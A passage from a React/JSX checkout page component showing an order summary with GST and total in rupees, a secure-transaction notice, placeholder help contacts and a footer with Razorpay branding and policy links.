                  </div>

                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">Subtotal</span>
                      <span>₹{orderDetails.subtotal.toFixed(2)}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">GST (18%)</span>
                      <span>₹{orderDetails.tax.toFixed(2)}</span>
                    </div>
                    <Separator className="my-2" />
                    <div className="flex justify-between font-semibold">
                      <span>Total</span>
                      <span>₹{orderDetails.total.toFixed(2)}</span>
                    </div>
                  </div>

                  <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
                    <div className="flex items-start">
                      <Shield className="h-5 w-5 text-[#2d87f3] mr-2 mt-0.5" />
                      <div>
                        <h4 className="font-medium text-sm text-[#2d87f3]">Secure Transaction</h4>
                        <p className="text-xs text-gray-600 mt-1">
                          Your payment information is encrypted with industry-standard protocols and we do not store
                          your card details.
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className="pt-4">
                    <h4 className="text-sm font-medium mb-2">Need Help?</h4>
                    <div className="text-xs text-gray-600 space-y-1">
                      <p>• Contact our support team at support@example.com</p>
                      <p>• Call us at +91 1234567890</p>
                      <p>
                        • Check our{" "}
                        <a href="#" className="text-[#2d87f3]">
                          FAQs
                        </a>
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-8 text-center text-xs text-gray-500">
          <p>© 2023 Razorpay. All rights reserved.</p>
          <div className="flex justify-center space-x-4 mt-2">
            <a href="#" className="hover:text-gray-700">
              Privacy Policy
            </a>
            <a href="#" className="hover:text-gray-700">
              Terms of Service
            </a>
            <a href="#" className="hover:text-gray-700">
              Refund Policy
            </a>
          </div>
        </div>
      </div>
    </div>
  )
}
